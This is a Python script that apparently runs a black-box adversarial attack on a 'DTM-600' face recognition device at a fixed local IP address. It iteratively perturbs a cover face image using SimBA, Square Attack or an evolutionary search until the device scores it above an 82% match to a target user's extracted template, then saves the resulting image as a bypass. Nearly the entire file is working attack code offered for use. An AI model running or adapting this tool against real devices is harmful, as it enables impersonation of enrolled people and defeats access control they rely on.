#!/usr/bin/env python3
"""
Adversarial Perturbation Attack for DTM-600 Face Recognition Bypass

Black-box attack that perturbs a cover face image to generate embeddings
similar to a target user's template, achieving >82% similarity to bypass
authentication.

Attack Methods:
    1. SimBA (Simple Black-box Attack) - Random coordinate perturbation
    2. Square Attack - Square-shaped perturbations
    3. Evolutionary Strategy - Population-based optimization

Usage:
    # Extract target template first
    python3 adversarial_oracle.py --target 192.168.30.178 --extract-template 4026974185

    # Run attack
    python3 adversarial_attack.py \\
        --target 192.168.30.178 \\
        --cover CANDIDATE_FACES/05_highcontrast_face.jpg \\
        --template user_target_template.bin \\
        --method simba
"""

import argparse
import json
import numpy as np
import random
import time
from datetime import datetime
from pathlib import Path
from typing import Optional, Tuple, List

# Optional imports
try:
    import cv2
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False

try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

from adversarial_oracle import AdversarialOracle


class AttackConfig:
    """Attack hyperparameters."""

    def __init__(self):
        # Perturbation bounds
        self.epsilon = 16  # Max perturbation per pixel (L-infinity bound)
        self.step_size = 4  # Step size per iteration

        # Query budget
        self.max_queries = 500  # Maximum oracle queries
        self.patience = 50  # Stop if no improvement for this many queries

        # Success threshold
        self.target_similarity = 0.82  # 82% to bypass

        # Rate limiting
        self.query_delay = 0.5  # Seconds between queries

        # Random restarts
        self.num_restarts = 3

        # Output
        self.output_dir = Path("ADVERSARIAL_RESULTS")
        self.save_intermediate = True
        self.save_interval = 50

    def to_dict(self):
        return {k: v for k, v in self.__dict__.items() if not k.startswith('_')}


def load_image(path: str) -> np.ndarray:
    """Load image as numpy array."""
    if HAS_CV2:
        img = cv2.imread(path)
        if img is None:
            raise ValueError(f"Could not load image: {path}")
        return img
    elif HAS_PIL:
        img = Image.open(path)
        arr = np.array(img)
        # Convert RGB to BGR for consistency
        if len(arr.shape) == 3 and arr.shape[2] == 3:
            arr = arr[:, :, ::-1]
        return arr
    else:
        raise RuntimeError("No image library available (cv2 or PIL)")


def save_image(path: str, image: np.ndarray):
    """Save image to file."""
    if HAS_CV2:
        cv2.imwrite(path, image)
    elif HAS_PIL:
        # Convert BGR to RGB
        if len(image.shape) == 3 and image.shape[2] == 3:
            image = image[:, :, ::-1]
        Image.fromarray(image).save(path)
    else:
        raise RuntimeError("No image library available")


class SimBAAttack:
    """
    Simple Black-box Attack (SimBA)
    https://arxiv.org/abs/1905.07121

    Randomly selects coordinates and directions, keeping changes
    that improve similarity to target.
    """

    def __init__(self, oracle: AdversarialOracle, config: AttackConfig):
        self.oracle = oracle
        self.config = config
        self.history = []

    def attack(self, cover_image: np.ndarray) -> Tuple[bool, np.ndarray, float]:
        """
        Run SimBA attack.

        Args:
            cover_image: Starting image (numpy array)

        Returns:
            Tuple of (success, perturbed_image, best_similarity)
        """
        h, w = cover_image.shape[:2]
        channels = cover_image.shape[2] if len(cover_image.shape) == 3 else 1

        # Initialize perturbation
        perturbation = np.zeros_like(cover_image, dtype=np.float32)

        # Initial query
        print("[*] Running initial query...")
        success, best_sim, _ = self.oracle.query(cover_image)
        if not success:
            print("[!] Initial face detection failed - cover image may not contain valid face")
            return (False, cover_image, 0.0)

        print(f"[+] Initial similarity: {best_sim:.4f} ({best_sim*100:.2f}%)")
        self.history.append({'query': 0, 'similarity': best_sim, 'accepted': True})

        no_improvement = 0
        query_num = 1

        while query_num < self.config.max_queries:
            # Random coordinate
            y = random.randint(0, h - 1)
            x = random.randint(0, w - 1)
            c = random.randint(0, channels - 1) if channels > 1 else 0

            # Random direction
            direction = random.choice([-1, 1])

            # Store old value
            old_val = perturbation[y, x, c] if channels > 1 else perturbation[y, x]

            # Apply perturbation step
            new_val = old_val + direction * self.config.step_size
            new_val = np.clip(new_val, -self.config.epsilon, self.config.epsilon)

            if channels > 1:
                perturbation[y, x, c] = new_val
            else:
                perturbation[y, x] = new_val

            # Create perturbed image
            perturbed = np.clip(cover_image.astype(np.float32) + perturbation,
                              0, 255).astype(np.uint8)

            # Query oracle
            success, sim, _ = self.oracle.query(perturbed)
            query_num += 1

            if not success:
                # Face detection failed - revert
                if channels > 1:
                    perturbation[y, x, c] = old_val
                else:
                    perturbation[y, x] = old_val
                self.history.append({'query': query_num, 'similarity': -1,
                                   'accepted': False, 'reason': 'no_face'})
                continue

            if sim > best_sim:
                # Improvement - keep change
                best_sim = sim
                no_improvement = 0
                print(f"[{query_num:4d}] Improved: {sim:.4f} ({sim*100:.2f}%) "
                      f"at ({y},{x},{c}) {'+' if direction > 0 else '-'}")
                self.history.append({'query': query_num, 'similarity': sim, 'accepted': True})

                # Save intermediate result
                if (self.config.save_intermediate and
                    query_num % self.config.save_interval == 0):
                    self._save_intermediate(perturbed, query_num, sim)

                # Check success
                if best_sim >= self.config.target_similarity:
                    print(f"\n[+] SUCCESS! Achieved {best_sim:.4f} >= {self.config.target_similarity}")
                    return (True, perturbed, best_sim)
            else:
                # No improvement - revert
                if channels > 1:
                    perturbation[y, x, c] = old_val
                else:
                    perturbation[y, x] = old_val
                no_improvement += 1
                self.history.append({'query': query_num, 'similarity': sim, 'accepted': False})

            # Early stopping
            if no_improvement >= self.config.patience:
                print(f"[!] No improvement for {no_improvement} queries, stopping")
                break

            # Progress update
            if query_num % 50 == 0:
                print(f"[{query_num:4d}] Best: {best_sim:.4f}, "
                      f"detection rate: {self.oracle.get_stats()['success_rate']:.2f}")

        # Return best result
        final_image = np.clip(cover_image.astype(np.float32) + perturbation,
                             0, 255).astype(np.uint8)
        return (False, final_image, best_sim)

    def _save_intermediate(self, image: np.ndarray, query_num: int, sim: float):
        """Save intermediate result."""
        out_dir = self.config.output_dir / "intermediate"
        out_dir.mkdir(parents=True, exist_ok=True)
        path = out_dir / f"q{query_num:04d}_sim{sim:.4f}.jpg"
        save_image(str(path), image)


class SquareAttack:
    """
    Square Attack - uses square-shaped perturbations
    https://arxiv.org/abs/1912.00049

    More query-efficient than SimBA for larger perturbations.
    """

    def __init__(self, oracle: AdversarialOracle, config: AttackConfig):
        self.oracle = oracle
        self.config = config
        self.history = []

    def attack(self, cover_image: np.ndarray) -> Tuple[bool, np.ndarray, float]:
        """Run Square Attack."""
        h, w = cover_image.shape[:2]
        channels = cover_image.shape[2] if len(cover_image.shape) == 3 else 1

        # Initialize with clean image
        perturbed = cover_image.copy().astype(np.float32)

        # Initial query
        print("[*] Running initial query...")
        success, best_sim, _ = self.oracle.query(cover_image)
        if not success:
            print("[!] Initial face detection failed")
            return (False, cover_image, 0.0)

        print(f"[+] Initial similarity: {best_sim:.4f}")
        self.history.append({'query': 0, 'similarity': best_sim})

        # Start with large squares, decrease over time
        p_init = 0.1  # Initial ratio of image to perturb

        for query_num in range(1, self.config.max_queries + 1):
            # Adaptive square size
            p = p_init * (1 - query_num / self.config.max_queries) ** 0.5
            side = max(1, int(min(h, w) * p))

            # Random position
            y = random.randint(0, h - side)
            x = random.randint(0, w - side)

            # Store old values
            old_patch = perturbed[y:y+side, x:x+side].copy()

            # Generate random perturbation for patch
            if channels > 1:
                patch_delta = np.random.choice(
                    [-self.config.epsilon, self.config.epsilon],
                    size=(side, side, channels)
                )
            else:
                patch_delta = np.random.choice(
                    [-self.config.epsilon, self.config.epsilon],
                    size=(side, side)
                )

            # Apply perturbation
            perturbed[y:y+side, x:x+side] = np.clip(
                cover_image[y:y+side, x:x+side].astype(np.float32) + patch_delta,
                0, 255
            )

            # Query
            test_image = perturbed.astype(np.uint8)
            success, sim, _ = self.oracle.query(test_image)

            if not success or sim <= best_sim:
                # Revert
                perturbed[y:y+side, x:x+side] = old_patch
                self.history.append({'query': query_num, 'similarity': sim or -1,
                                   'accepted': False})
            else:
                # Keep
                best_sim = sim
                print(f"[{query_num:4d}] Improved: {sim:.4f} (square {side}x{side} at ({y},{x}))")
                self.history.append({'query': query_num, 'similarity': sim, 'accepted': True})

                if best_sim >= self.config.target_similarity:
                    print(f"\n[+] SUCCESS! Achieved {best_sim:.4f}")
                    return (True, test_image, best_sim)

            if query_num % 50 == 0:
                print(f"[{query_num:4d}] Best: {best_sim:.4f}, square size: {side}")

        return (False, perturbed.astype(np.uint8), best_sim)


class EvolutionaryAttack:
    """
    Evolutionary Strategy attack - uses population-based optimization.
    Good for escaping local minima.
    """

    def __init__(self, oracle: AdversarialOracle, config: AttackConfig):
        self.oracle = oracle
        self.config = config
        self.history = []
        self.population_size = 10
        self.mutation_rate = 0.1

    def attack(self, cover_image: np.ndarray) -> Tuple[bool, np.ndarray, float]:
        """Run evolutionary attack."""
        h, w = cover_image.shape[:2]

        # Initialize population with small random perturbations
        print("[*] Initializing population...")
        population = []
        fitness = []

        for i in range(self.population_size):
            delta = np.random.uniform(
                -self.config.epsilon * 0.1,
                self.config.epsilon * 0.1,
                size=cover_image.shape
            ).astype(np.float32)

            perturbed = np.clip(cover_image.astype(np.float32) + delta, 0, 255).astype(np.uint8)
            success, sim, _ = self.oracle.query(perturbed)

            if success:
                population.append(delta)
                fitness.append(sim)
                print(f"  Individual {i}: {sim:.4f}")
            else:
                population.append(np.zeros_like(cover_image, dtype=np.float32))
                fitness.append(0.0)

        best_idx = np.argmax(fitness)
        best_sim = fitness[best_idx]
        best_delta = population[best_idx].copy()

        print(f"[+] Initial best: {best_sim:.4f}")

        query_num = self.population_size

        while query_num < self.config.max_queries:
            # Tournament selection
            parents = []
            for _ in range(2):
                i, j = random.sample(range(len(population)), 2)
                winner = i if fitness[i] > fitness[j] else j
                parents.append(population[winner])

            # Crossover
            mask = np.random.rand(*cover_image.shape) > 0.5
            child = np.where(mask, parents[0], parents[1])

            # Mutation
            mutation_mask = np.random.rand(*cover_image.shape) < self.mutation_rate
            mutation = np.random.uniform(-self.config.step_size, self.config.step_size,
                                        size=cover_image.shape)
            child = child + mutation_mask * mutation
            child = np.clip(child, -self.config.epsilon, self.config.epsilon)

            # Evaluate
            perturbed = np.clip(cover_image.astype(np.float32) + child, 0, 255).astype(np.uint8)
            success, sim, _ = self.oracle.query(perturbed)
            query_num += 1

            if success:
                # Replace worst individual
                worst_idx = np.argmin(fitness)
                if sim > fitness[worst_idx]:
                    population[worst_idx] = child
                    fitness[worst_idx] = sim

                if sim > best_sim:
                    best_sim = sim
                    best_delta = child.copy()
                    print(f"[{query_num:4d}] New best: {sim:.4f}")

                    if best_sim >= self.config.target_similarity:
                        final = np.clip(cover_image.astype(np.float32) + best_delta,
                                       0, 255).astype(np.uint8)
                        print(f"\n[+] SUCCESS!")
                        return (True, final, best_sim)

            if query_num % 50 == 0:
                avg_fitness = np.mean(fitness)
                print(f"[{query_num:4d}] Best: {best_sim:.4f}, Avg: {avg_fitness:.4f}")

        final = np.clip(cover_image.astype(np.float32) + best_delta, 0, 255).astype(np.uint8)
        return (False, final, best_sim)


def run_attack(args):
    """Main attack runner."""
    # Setup output directory
    config = AttackConfig()
    config.epsilon = args.epsilon
    config.step_size = args.step_size
    config.max_queries = args.max_queries
    config.target_similarity = args.threshold
    config.output_dir = Path(args.output)
    config.output_dir.mkdir(parents=True, exist_ok=True)

    # Load cover image
    print(f"[*] Loading cover image: {args.cover}")
    cover_image = load_image(args.cover)
    print(f"    Dimensions: {cover_image.shape}")

    # Initialize oracle
    print(f"[*] Initializing oracle (target: {args.target})")
    if not Path(args.template).exists():
        print(f"[!] Template file not found: {args.template}")
        print("[!] Run: python3 adversarial_oracle.py --extract-template <FACE_ID>")
        return

    oracle = AdversarialOracle(args.target, args.template, lib_id=args.lib)

    if not oracle.check_device_alive():
        print(f"[!] Device not responding at {args.target}")
        return

    print(f"[+] Device online")

    # Select attack method
    if args.method == 'simba':
        attack = SimBAAttack(oracle, config)
    elif args.method == 'square':
        attack = SquareAttack(oracle, config)
    elif args.method == 'evolutionary':
        attack = EvolutionaryAttack(oracle, config)
    else:
        print(f"[!] Unknown method: {args.method}")
        return

    # Run attack with restarts
    overall_best_sim = 0.0
    overall_best_image = cover_image

    for restart in range(config.num_restarts):
        print(f"\n{'='*60}")
        print(f"[*] Restart {restart + 1}/{config.num_restarts}")
        print(f"{'='*60}")

        start_time = time.time()
        success, result_image, best_sim = attack.attack(cover_image)
        elapsed = time.time() - start_time

        print(f"\n[*] Restart {restart + 1} complete:")
        print(f"    Best similarity: {best_sim:.4f} ({best_sim*100:.2f}%)")
        print(f"    Queries used: {oracle.get_stats()['total_queries']}")
        print(f"    Time: {elapsed:.1f}s")

        if best_sim > overall_best_sim:
            overall_best_sim = best_sim
            overall_best_image = result_image

        if success:
            break

    # Save results
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    # Final image
    final_path = config.output_dir / f"adversarial_{timestamp}_sim{overall_best_sim:.4f}.jpg"
    save_image(str(final_path), overall_best_image)
    print(f"\n[+] Saved adversarial image: {final_path}")

    # Attack log
    log_path = config.output_dir / f"attack_log_{timestamp}.json"
    log_data = {
        'timestamp': timestamp,
        'method': args.method,
        'config': {k: str(v) for k, v in config.to_dict().items()},
        'cover_image': args.cover,
        'target_template': args.template,
        'device': args.target,
        'result': {
            'success': overall_best_sim >= config.target_similarity,
            'best_similarity': overall_best_sim,
            'queries': oracle.get_stats(),
        },
        'history': attack.history if hasattr(attack, 'history') else []
    }
    log_path.write_text(json.dumps(log_data, indent=2))
    print(f"[+] Saved attack log: {log_path}")

    # Summary
    print(f"\n{'='*60}")
    print("ATTACK SUMMARY")
    print(f"{'='*60}")
    print(f"Method: {args.method}")
    print(f"Best similarity: {overall_best_sim:.4f} ({overall_best_sim*100:.2f}%)")
    print(f"Target threshold: {config.target_similarity}")
    print(f"Total queries: {oracle.get_stats()['total_queries']}")
    print(f"Success rate: {oracle.get_stats()['success_rate']:.2%}")

    if overall_best_sim >= config.target_similarity:
        print(f"\n[+] BYPASS ACHIEVED!")
        print(f"[+] The adversarial image should authenticate as the target user")
    else:
        print(f"\n[-] Bypass not achieved (need {config.target_similarity:.0%}, got {overall_best_sim:.0%})")
        print(f"    Try: --max-queries {config.max_queries * 2} or different --method")

    # Cleanup
    oracle.cleanup_all()


def main():
    parser = argparse.ArgumentParser(
        description="DTM-600 Face Recognition Adversarial Attack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    # Extract user's template first
    python3 adversarial_oracle.py --target 192.168.30.178 \\
        --extract-template 4026974185 --lib 4

    # Run SimBA attack
    python3 adversarial_attack.py \\
        --cover CANDIDATE_FACES/05_highcontrast_face.jpg \\
        --template user_target_template.bin \\
        --method simba

    # Run with more queries and higher epsilon
    python3 adversarial_attack.py \\
        --cover cover_face.jpg \\
        --max-queries 1000 \\
        --epsilon 32 \\
        --method square
        """
    )

    parser.add_argument("--target", default="192.168.30.178",
                       help="Device IP address")
    parser.add_argument("--cover", required=True,
                       help="Cover face image to perturb")
    parser.add_argument("--template", default="user_target_template.bin",
                       help="Target user's template file")
    parser.add_argument("--lib", type=int, default=3,
                       help="Face library ID (3=Employee, 4=Visitor)")

    parser.add_argument("--method", choices=['simba', 'square', 'evolutionary'],
                       default='simba', help="Attack method")
    parser.add_argument("--epsilon", type=int, default=16,
                       help="Max perturbation per pixel (L-inf bound)")
    parser.add_argument("--step-size", type=int, default=4,
                       help="Perturbation step size")
    parser.add_argument("--max-queries", type=int, default=500,
                       help="Maximum oracle queries")
    parser.add_argument("--threshold", type=float, default=0.82,
                       help="Target similarity threshold (default: 0.82)")

    parser.add_argument("--output", default="ADVERSARIAL_RESULTS",
                       help="Output directory")

    args = parser.parse_args()

    run_attack(args)


if __name__ == "__main__":
    main()
